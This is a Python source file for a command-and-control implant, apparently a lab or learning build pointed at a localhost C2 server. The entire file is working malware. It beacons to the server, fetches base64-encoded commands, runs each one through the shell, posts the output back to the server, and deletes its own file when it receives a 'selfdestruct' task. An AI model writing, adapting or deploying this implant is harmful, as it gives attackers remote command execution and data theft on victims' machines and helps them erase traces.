import base64  # Import base64 module
import os
import subprocess
import time
import uuid

import requests

C2_URL = "http://127.0.0.1:8000"  # Ensure this matches the C2 IP/Port
IMPLANT_ID = str(uuid.uuid4())  # Unique implant ID
SLEEP_TIME = 10  # seconds between beacons


# Debugging: Print the Implant ID at startup
print(f"[*] Implant started with ID: {IMPLANT_ID}")


def encode(data):
    return base64.b64encode(data.encode()).decode()


def decode(data):
    return base64.b64decode(data.encode()).decode()


def get_task():
    try:
        print("[*] Attempting to fetch task from C2 server...")
        r = requests.get(f"{C2_URL}/task/{IMPLANT_ID}")
        if r.status_code == 200:
            print(f"[*] Received task: {r.text}")
            return decode(r.text)
        else:
            print(f"[!] Failed to fetch task, status code: {r.status_code}")
    except Exception as e:
        print(f"Error getting task: {e}")
    return None


def send_result(output):
    try:
        encoded = encode(output)
        requests.post(f"{C2_URL}/report", json={"id": IMPLANT_ID, "output": encoded})
    except Exception as e:
        print(f"Error sending result: {e}")


def self_destruct():
    print("[*] Self-destruct triggered.")
    os.remove(__file__)  # delete itself
    exit()


def main_loop():
    while True:
        task = get_task()
        if task:
            if task == "selfdestruct":
                self_destruct()
            else:
                try:
                    result = subprocess.getoutput(task)
                    send_result(result)
                except Exception as e:
                    send_result(f"Error: {e}")
        time.sleep(SLEEP_TIME)


if __name__ == "__main__":
    main_loop()
